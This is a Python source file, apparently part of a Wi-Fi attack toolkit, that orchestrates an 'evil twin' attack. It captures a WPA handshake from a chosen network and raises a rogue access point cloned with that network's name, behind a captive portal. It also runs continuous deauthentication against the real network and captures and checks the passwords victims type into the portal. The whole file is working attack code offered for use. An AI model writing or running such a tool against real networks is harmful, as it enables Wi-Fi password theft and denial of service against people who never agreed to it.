from sources import Sources
from changemode import ChangeMode
from captive_portal import CaptivePortal
import os
import time
import multiprocessing
from colorama import init, Fore
init()
GREEN = Fore.GREEN
RED   = Fore.RED
BLUE   = Fore.BLUE
RESET = Fore.RESET


class EvilTwin2:
    def __init__(self):
        self.wireless_interface1 = ""
        self.wireless_mode1 = ""
        self.wireless_interface2 = ""
        self.wireless_mode2 = ""
        self.handshakefiles_folder = f"{os.getcwd()}/src/handshake_files/"
        self.target_network = {}
        self.start_eviltwin2()
        

    def start_eviltwin2(self):
        source = Sources()
        list_of_interfaces = []
        list_of_interfaces = source.listinterfaces()
        try:
            interfaceinput =  input(f"\n{GREEN} Select wireless adapter for Fake access point. Type 0-{str(source.i - 1)} -->{RESET}")
            self.wireless_interface1 = list_of_interfaces[int(interfaceinput)]
            interfaceinput = input(f"\n{GREEN} Select wireless adapter for listening networks, Capturing Handshake and Deauth Attack(Its mode would be changed to MOnitor). Type 0-{str(source.i - 1)} -->{RESET}")
            self.wireless_interface2 = list_of_interfaces[int(interfaceinput)]
        except (IndexError, ValueError) as e:
            print(f"{RED}[--] Please Select correct index number for wireless adaptor or Select Correct WIreless Adaptor...{RESET}")
            time.sleep(3) 
        else:
            self.wireless_mode1 = source.checkmode(self.wireless_interface1)
            self.wireless_mode2 = source.checkmode(self.wireless_interface2)
            wireless_interface2_manufacturer = Sources().get_interface_menufacturer_name(self.wireless_interface2)
            wireless_interface2_mac_address = source.get_dev_path(self.wireless_interface2)
            ifindex = source.get_ifindex(self.wireless_interface2)
            if self.wireless_mode2 == "Managed":
                ChangeMode().changetomonitormode(self.wireless_interface2)
            list_of_interfaces = source.listinterfaces()
            os.system("clear")
            for interface in list_of_interfaces:
                if (wireless_interface2_mac_address == source.get_dev_path(interface) or ifindex == Sources().get_ifindex(interface)) and wireless_interface2_manufacturer == source.get_interface_menufacturer_name(interface) and source.checkmode(interface) == "Monitor":
                    self.wireless_interface2 = interface
            self.wireless_mode2 = source.checkmode(self.wireless_interface2)
            try:
                self.target_network = source.select_network(self.wireless_interface2)
                os.system("clear")
                captured_file = source.capturing_handshake(self.wireless_interface2,self.target_network["bssid"],self.target_network["channel"],self.handshakefiles_folder)
                time.sleep(2)
                os.system("clear")
                if captured_file == "":
                    print("\n[--] There is no handshake file captured or selected. Without Handshake file you could not Verify the password that would be captured by this attack...\n")
                else:
                    print("\n-------------------------------------------------------------------------------")
                    print(f"The Handshake file is {captured_file}")
                    print("-------------------------------------------------------------------------------\n")
                
                captive_portal = CaptivePortal()
                captive_portal.networkinterface = self.wireless_interface1
                captive_portal.networkname = self.target_network["ssid"]
                captive_portal.setup_captive_portal()
                os.system("clear")
                source.configue_files(self.wireless_interface1,self.target_network["ssid"],self.target_network["channel"])
                source.disconnect_to_open_wifi(self.wireless_interface1)
                source.access_point(self.wireless_interface1)
                source.change_interface_channel(self.wireless_interface2,self.target_network["channel"])
                os.system("clear")
                deauth = multiprocessing.Process(target=source.deauth, args=(self.wireless_interface2,self.target_network["bssid"],"0", ))
                deauth.start()
                source.capture_password_and_verify(self.wireless_interface1,f"{self.handshakefiles_folder}{captured_file}")
            except Exception as e:
                print(f"{RED}Following Error Occur:>>  {e}{RESET}")
                print(f"{RED}[--] It may be due to not selecting correct wireless adaptor or target network or some other issues. TRY AGAIN!!!!{RESET}")
                print(f"{RED}Closing Whole Attack:: {RESET}")
                source.closing_access_point()
                time.sleep(2)
            except KeyboardInterrupt:
                print(f"\n{GREEN}[+]Want to close the whole Attack:::")
                close = input(f" \tType 'y' for Yes and 'n' for no  >>{RESET}").lower()
                if close == "y":
                    source.closing_access_point()
                time.sleep(1)
                os.system("clear")
            else:
                if source.pass_found == 1:
                    print(f"\n{GREEN}[+]Want to close the whole Attack:::")
                    close = input(f" \tType 'y' for Yes and 'n' for no  >>{RESET}").lower()
                    if close == "y":
                        source.closing_access_point()
                    time.sleep(1)
                    os.system("clear")
                    
                else:       
                    check = 1
                    while check == 1:
                        try:
                            source.kill_process("hostapd")
                            time.sleep(1)
                            print("\n\n\nDue to some issue with hostapd connection was not working properly so configuring Again and Capturing Data....")
                            os.system("hostapd hostapd.conf -B")
                            print("\nPress 'CTRL+C' Once to restart Access Point and Capturing. Press 'CTRL+C' twice to close the attack.")
                            source.capture_password_and_verify(self.wireless_interface1,f"{self.handshakefiles_folder}{captured_file}")
                        except KeyboardInterrupt:
                            check = 0
                            os.system("clear")
                            print(f"\n{GREEN}[+]Want to close the whole Attack:::")
                            close = input(f" \tType 'y' for Yes and 'n' for no  >>{RESET}").lower()
                            if close == "y":
                                source.closing_access_point()
                            time.sleep(1)
                            os.system("clear")
                        except Exception as e:
                            check = 0
                            print(f"{RED}Following Error Occur:>>  {e}{RESET}")
                            print(f"{RED}[--] It may be due to not selecting correct wireless adaptor or target network or some other issues. TRY AGAIN!!!!{RESET}")
                            print(f"{RED}Closing Whole Attack:: {RESET}")
                            source.closing_access_point()
                            time.sleep(2)
                        else:
                            if source.pass_found == True:
                                check = 0
                                print(f"\n{GREEN}[+]Want to close the whole Attack:::")
                                close = input(f" \tType 'y' for Yes and 'n' for no  >>{RESET}").lower()
                                if close == "y":
                                    source.closing_access_point()
                                time.sleep(1)
                                os.system("clear")
                                
                            else:
                                pass
            
                                 



    
            



